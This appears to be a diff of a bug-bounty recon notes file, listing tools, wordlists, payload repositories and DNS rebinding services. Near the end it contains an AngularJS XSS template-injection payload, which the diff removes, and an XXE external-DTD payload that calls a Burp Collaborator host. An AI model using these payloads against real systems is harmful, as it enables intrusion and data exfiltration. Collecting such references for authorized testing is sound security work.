@@ -45,6 +45,7 @@
 ### Wayback Machine
 	https://github.com/tomnomnom/waybackurls
 		cat subdomains.txt | waybackurls > waybackurls.txt
+		
 	https://github.com/tomnomnom/hacks
 		cat waybackurls.txt | go run /root/Tools/hacks/anti-burl/main.go | tee waybackurls_valid.txt
 	
@@ -69,14 +70,22 @@
 ### Wordlist
 	https://portswigger.net/bappstore/21df56baa03d499c8439018fe075d3d7
 		Wordlist Extractor
+		
 	https://github.com/ameenmaali/wordlistgen
 		cat hosts.txt | wordlistgen
+		
 	https://github.com/adamtlangley/gitscraper
+	
 	https://github.com/riramar/MyPayloads
+	
 	https://github.com/danielmiessler/SecLists
+	
 	https://github.com/swisskyrepo/PayloadsAllTheThings
+	
 	https://github.com/fuzzdb-project/fuzzdb
+	
 	https://github.com/google/fuzzing
+	
 	https://github.com/xyele/hackerone_wordlist
 
 ### Directory Bruteforcing
@@ -126,6 +135,7 @@
 
 ### GraphQL
 	https://github.com/doyensec/graph-ql
+	
 	https://lab.wallarm.com/securing-and-attacking-graphql-part-1-overview/
 
 ### General
@@ -241,6 +251,8 @@
 	https://github.com/awslabs/git-secrets
 	
 	https://github.com/eth0izzle/shhgit
+	
+	https://www.shhgit.com/
 
 ### Google Dorks Scanning
 	https://github.com/opsdisk/pagodo
@@ -275,11 +287,11 @@
 		PayloadsAllTheThings
   
 	XSS
-		{{constructor.constructor('alert()')()}} # AngularJS
 		https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 		
 	XXE
-		<!DOCTYPE foo SYSTEM "http://xpto.burpcollaborator.net/xpto.dtd">
+		https://phonexicum.github.io/infosec/xxe.html
+			<!DOCTYPE foo SYSTEM "http://xpto.burpcollaborator.net/xpto.dtd">
 
 ### Reusing Cookies
 	https://medium.com/@ricardoiramar/reusing-cookies-23ed4691122b
@@ -289,9 +301,13 @@
 
 ### DNS Rebinding
 	https://github.com/brannondorsey/dns-rebind-toolkit
+	
 	https://github.com/brannondorsey/whonow
+	
 	https://nip.io
+	
 	http://xip.io
+	
 	https://sslip.io
 
 ### SMTP Header Injection
